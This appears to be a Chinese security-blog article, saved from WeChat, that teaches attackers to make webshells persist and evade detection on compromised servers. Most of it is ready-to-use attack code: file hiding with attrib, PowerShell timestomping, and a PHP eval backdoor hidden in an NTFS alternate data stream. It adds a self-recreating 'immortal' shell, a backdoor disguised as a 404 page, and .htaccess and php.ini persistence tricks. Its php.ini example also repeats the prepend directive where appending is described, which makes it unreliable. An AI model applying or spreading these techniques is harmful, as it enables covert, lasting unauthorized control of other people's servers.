\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/UqmN\_b4EXewCN7WPei14\_A)

如果想让自己的 Webshell 留的更久一些，除了 Webshell 要免杀，还需要注意一些隐藏技巧，比如隐藏文件，修改时间属性，隐藏文件内容等。

**1、隐藏文件**

使用 Attrib +s +a +h +r 命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。

```
attrib +s +a +h +r shell.php   //隐藏shell.php文件

```

**2、修改文件时间属性**

当你试图在一堆文件中隐藏自己新创建的文件，那么，除了创建一个迷惑性的文件名，还需要修改文件的修改日期。

```
//修改时间修改
Set-ItemProperty -Path 2.txt LastWriteTime -Value "2020-11-01 12:12:12"
//访问时间修改
Set-ItemProperty -Path 2.txt LastAccessTime -Value "2020-11-01 12:12:12"
//创建时间修改
Set-ItemProperty -Path 2.txt CreationTime -Value "2020-11-01 12:12:12"

```

使用命令获取文件属性

```
Get-ItemProperty -Path D:\\1.dll | Format-list -Property \* -Force

```

修改某个文件夹下所有文件的创建和修改时间

```
powershell.exe -command "ls 'upload\\\*.\*' | foreach-object { $\_.LastWriteTime =  Get-Date ; $\_.CreationTime = '2018/01/01 19:00:00' }"

```

**3、利用 ADS 隐藏文件内容**

在服务器上 echo 一个数据流文件进去，比如 index.php 是网页正常文件，我们可以这样子搞：　

```
echo ^<?php @eval($\_POST\['chopper'\]);?^> > index.php:hidden.jpg

```

这样子就生成了一个不可见的 shell hidden.jpg，常规的文件管理器、type 命令，dir 命令、del 命令发现都找不出那个 hidden.jpg 的。

利用 include 函数，将 index.php:hidden.jpg 进行 hex 编码，把这个 ADS 文件 include 进去，这样子就可以正常解析我们的一句话了。

```
<?php @include(PACK('H\*','696E6465782E7068703A68696464656E2E6A7067'));?>

```

**4、不死马**

不死马会删除自身，以进程的形式循环创建隐蔽的后门。

```
<?php
set\_time\_limit(0);  
ignore\_user\_abort(1); 
unlink(\_\_FILE\_\_);     //删除自身
while(1)
{    
    file\_put\_contents('shell.php','<?php @eval($\_GET\[cmd\]);?>');  //创建shell.php，这里最好用免杀的一句话
    sleep(10);    //间隔时间
}
?>

```

处理方式最简单有效的办法，就是重启服务就可以删除 webshell 文件。

**5、中间件后门**

将编译好的 so 文件复制到 modules 文件夹，启动后门模块，重启 Apache。当发送特定参数的字符串过去时，即可触发后门。

github 项目地址：

```
https://github.com/VladRico/apache2\_BackdoorMod

```

**6、利用 404 页面隐藏后门**

404 页面主要用来提升用户体验，可用来隐藏后门文件。

```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
@preg\_replace("/\[pageerror\]/e",$\_POST\['error'\],"saft");
header('HTTP/1.1 404 Not Found');
?>

```

**7、利用 .htaccess 文件构成 PHP 后门**

一般. htaccess 可以用来留后门和针对黑名单绕过，在上传目录创建. htaccess 文件写入，无需重启即可生效，上传 png 文件解析。

```
AddType application/x-httpd-php .png

```

另外，在. htaccess 加入 php 解析规则，把文件名包含 1 的解析成 php，上传 1.txt 即可解析。

```
<FilesMatch "1"> 
SetHandler application/x-httpd-php 
</FilesMatch>

```

**8、利用 php.ini 隐藏后门文件**

php.ini 中可以指定在主文件执行前后自动解析的文件名称，常用于页面公共头部和尾部，也可以用来隐藏 php 后门。

```
；在PHP文档之前自动添加文件。
auto\_prepend\_file = "c:\\tmp.txt"
;在PHP文档之后自动添加文件。
auto\_prepend\_file = "c:\\tmp.txt"

```

需重启服务生效，访问任意一个 php 文件即可获取 webshell。